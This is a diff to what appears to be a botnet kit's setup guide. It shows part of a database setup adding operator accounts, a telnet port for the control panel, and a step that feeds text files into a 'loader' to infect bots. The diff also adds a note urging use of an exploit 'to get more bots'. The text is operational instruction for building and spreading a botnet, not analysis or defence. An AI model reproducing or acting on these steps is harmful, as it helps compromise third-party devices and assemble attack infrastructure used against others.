@@ -141,6 +141,7 @@ CREATE TABLE `whitelist` (
   KEY `prefix` (`prefix`)
 );
 INSERT INTO users VALUES (NULL, 'USERNAME', 'PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');
+INSERT INTO users VALUES (NULL, 'USERNAME2', 'PASSWORD2', 0, 0, 0, 0, -1, 1, 30, '');
 exit;
 
 ------------------------------------------------------------------------------------
@@ -178,4 +179,6 @@ Telnet port 1312
 // How to load bots
 cd loader
 cat *.txt | ./loader
+
+NOTE: Use exploit to get more bots, all instructions are in the files
  ------------------------------------------------------------------------------------
